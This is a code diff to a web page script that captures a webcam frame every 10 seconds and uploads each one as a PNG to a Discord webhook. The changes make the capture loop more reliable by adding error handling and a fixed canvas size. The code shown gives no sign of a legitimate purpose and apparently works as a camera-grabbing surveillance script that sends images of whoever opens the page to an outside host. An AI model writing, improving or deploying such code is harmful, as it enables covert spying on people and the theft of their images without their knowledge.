@@ -32,17 +32,23 @@
 
     // Function to start video stream
     async function startVideoStream() {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        sendVideoToWebhook();
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            sendVideoToWebhook();
+        } catch (error) {
+            console.error('Error accessing camera:', error);
+        }
     }
 
     // Function to capture image and send to Discord webhook
     function sendVideoToWebhook() {
         const canvas = document.createElement('canvas');
         const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+
+        // Set canvas dimensions
+        canvas.width = 640; // Adjust according to your video settings
+        canvas.height = 480;
 
         setInterval(() => {
             context.drawImage(video, 0, 0, canvas.width, canvas.height); // Capture frame
@@ -60,12 +66,14 @@
                         if (response.ok) {
                             console.log('Frame sent successfully');
                         } else {
-                            console.error('Error sending frame:', response);
+                            console.error('Error sending frame:', response.statusText);
                         }
                     })
                     .catch(error => {
                         console.error('Fetch error:', error);
                     });
+                } else {
+                    console.error('Blob is null, frame capture failed');
                 }
             }, 'image/png');
         }, 10000); // Send every 10 seconds
